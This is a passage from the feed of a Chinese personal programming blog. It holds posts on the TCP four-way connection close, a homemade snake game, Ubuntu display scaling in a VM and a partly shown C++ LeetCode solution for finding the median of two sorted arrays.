<h3 class="anchor anchorWithStickyNavbar_K1VF" id="然后为啥要四次挥手呢">然后为啥要四次挥手呢<a href="https://vienna.bio/blog/%E7%90%86%E8%A7%A3-TCP-%E7%9A%84%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E3%80%81%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B#%E7%84%B6%E5%90%8E%E4%B8%BA%E5%95%A5%E8%A6%81%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E5%91%A2" class="hash-link" aria-label="Direct link to 然后为啥要四次挥手呢" title="Direct link to 然后为啥要四次挥手呢">​</a></h3>
<p>现时情况：双方建立了连接，可以互相发送数据
首先我这边想断了连接，那我第一次挥手，说：我要断开，从现在起我也不给你发数据了，</p>
<p>他那边收到了这个断开请求后，先发出一个确认包：好的，好的，我知道了，
我先收到这个确认后，就知道他收到了我的断开请求了。</p>
<p>然而因为他那边也是可以发送数据的，突然让他停下来，他也得把手上的事情干完啊，那对方等到手上没事情后（数据发完了），就会再发出一个：好的，我准备好了，断开吧。</p>
<p>最后我这边收到他的就绪信息后，现在大家都没事了，断开吧。</p>
<p>嗯，四次挥手就这样。</p>
<p>Reference:</p>
<p><a href="http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473778&amp;idx=1&amp;sn=43906c61316fc9a899f999783d3a9eb3&amp;scene=0#wechat_redirect" target="_blank" rel="noopener noreferrer">戏说西游||TCP/IP协议的由来</a></p>
<p><a href="http://www.cnblogs.com/SeaSky0606/p/4741982.html" target="_blank" rel="noopener noreferrer">为什么“三次握手，四次挥手”？</a></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[山寨了个贪吃蛇]]></title>
        <id>https://vienna.bio/blog/山寨了个贪吃蛇</id>
        <link href="https://vienna.bio/blog/山寨了个贪吃蛇"/>
        <updated>2016-06-22T15:26:29.000Z</updated>
        <summary type="html"><![CDATA[看到知乎一个条问答：计算机应届生简历中，「贪吃蛇，俄罗斯方块」等小项目有必要写到简历中吗？]]></summary>
        <content type="html"><![CDATA[<p>看到知乎一个条问答：<a href="https://www.zhihu.com/question/36280350" target="_blank" rel="noopener noreferrer">计算机应届生简历中，「贪吃蛇，俄罗斯方块」等小项目有必要写到简历中吗？</a></p>
<p>就试做了个贪吃蛇</p>
<p><a href="https://gist.github.com/viennadd/a67047dd21cf74fe2d034cd44a43fa31" target="_blank" rel="noopener noreferrer">https://gist.github.com/viennadd/a67047dd21cf74fe2d034cd44a43fa31</a></p>
<p>刚开搞的时候发现命令行的按键处理都是平台相关的，就用 getchar 代替，需要按回车，</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Ubuntu 对 Retina Display 的支持]]></title>
        <id>https://vienna.bio/blog/Ubuntu-对-Retina-Display-的支持</id>
        <link href="https://vienna.bio/blog/Ubuntu-对-Retina-Display-的支持"/>
        <updated>2016-04-24T13:54:00.000Z</updated>
        <summary type="html"><![CDATA[VM 装 Ubuntu 显示效果朦朦的, 如果把 VM 的 retina 支持勾上又会导致整体 icon 缩小, 原来在这个情况下调一下 System Settings 的 scale, 效果就会合适。]]></summary>
        <content type="html"><![CDATA[<p>VM 装 Ubuntu 显示效果朦朦的, 如果把 VM 的 retina 支持勾上又会导致整体 icon 缩小, 原来在这个情况下调一下 System Settings 的 scale, 效果就会合适。</p>
<p>步骤如下
<a href="http://askubuntu.com/questions/472262/adapt-ubuntu-to-a-high-dpi-resolution-screen?lq=1" target="_blank" rel="noopener noreferrer">http://askubuntu.com/questions/472262/adapt-ubuntu-to-a-high-dpi-resolution-screen?lq=1</a></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Leetcode - Median of Two Sorted Arrays]]></title>
        <id>https://vienna.bio/blog/Leetcode-Median-of-Two-Sorted-Arrays</id>
        <link href="https://vienna.bio/blog/Leetcode-Median-of-Two-Sorted-Arrays"/>
        <updated>2016-04-07T23:19:05.000Z</updated>
        <summary type="html"><![CDATA[对这题想到一个方法，既然是两个 Sorted Arrays, 用 Merge Sort 类似的归并方法组合两个数组就可以了, 根据总长度的奇偶抽取第 N 大的数值出来就完成啦。但这样做的话运行时间是 O(m+n / 2), 题目要求 O(log(m+n))]]></summary>
        <content type="html"><![CDATA[<p>对这题想到一个方法，既然是两个 Sorted Arrays, 用 Merge Sort 类似的归并方法组合两个数组就可以了, 根据总长度的奇偶抽取第 N 大的数值出来就完成啦。但这样做的话运行时间是 O(m+n / 2), 题目要求 O(log(m+n))</p>
<p>第一个想法就是二分, 参考了几个博文之后, 先准备一个 Kth 函数用于寻找两个 sorted array 的第 K 小的数, 然后中位数就很容易了, 反而一开始追求二分中位数似乎会有不少 corner cases</p>
<p>那先把问题换成两个有序数组的第 K 小的数值</p>
<p>有以下步骤</p>
<ul>
<li>有序 vector v1 和 v2, 求第 K 小</li>
<li>二分思想是每次从 v1 和 v2 排除一半的可选元素</li>
<li>有 x, y &gt; 0 &amp;&amp; x + y == k,</li>
<li>x, y 的取值也是有讲究, x = len(v1) / (len(v1) + len(v2)) * k, 这个意思是 len(v1) 占总 size 的百分比, 再乘以 k 的话就可以确保 x 的取值不会超出 v1 的数组范围, 这里简化了, 实际代码需要注意一些边界问题</li>
<li>如果 <strong>v1[x] &lt; v2[y]</strong>, 则 v1[0 .. x] 的元素都不可能是第 K 小, 他们都肯定比第 K 的数值要小了, 我们则可以排除掉这些数值,</li>
<li><strong>v1[x] &gt; v2[y]</strong> 的话都是同样的思想</li>
<li>调整 v1, v2 的长度, 下表值, k 的值等, 然后重复这些取值然后比较的步骤,</li>
<li>调整完 size 和 下标后, 检查一下 k 是否下降到 1, 第 1 小的值是 min(v1[0], v2[0]), 还有如果其中一个 vector 的 size 下降到 0, 那可以直接返回另一个 vector 的第 k 个值</li>
<li>如果是 <strong>v1[x] == v2[y]</strong> 的话, x + y == k, v1[x] == v2[y], 那这个数值已经是第 K 小了, 这里是一个 base case</li>
</ul>
<p>大家可以 Leetcode 测试一下自己的代码 <a href="https://leetcode.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener noreferrer">https://leetcode.com/problems/median-of-two-sorted-arrays/</a></p>
<p>下面是我提交的代码</p>
<div class="language-cpp codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-cpp codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">ifndef</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">LEETCODE_MEDIAN_OF_TWO_SORTED_ARRAYS_H</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">LEETCODE_MEDIAN_OF_TWO_SORTED_ARRAYS_H</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;vector&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;algorithm&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;cassert&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">namespace</span><span class="token plain"> std</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Solution</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">double</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">findMedianSortedArrays</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> nums1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> nums2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">median</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">median</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> total_size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> nums1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> nums2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">total_size </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">findKtnElement</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> nums2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> total_size </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">findKtnElement</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> nums2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> total_size </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token function" style="color:#d73a49">findKtnElement</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">nums1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> nums2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> total_size </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2.0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">double</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">median</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2.0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">min</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> a </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">?</span><span class="token plain"> a </span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">findKtnElement</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> k</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> v1_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> v2_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_len </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v2_len </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">min</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">assert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_len </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v2_len </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> k</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> v1_begin </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">begin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> v2_begin </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">begin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v1_len </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_len </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v2_len </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" 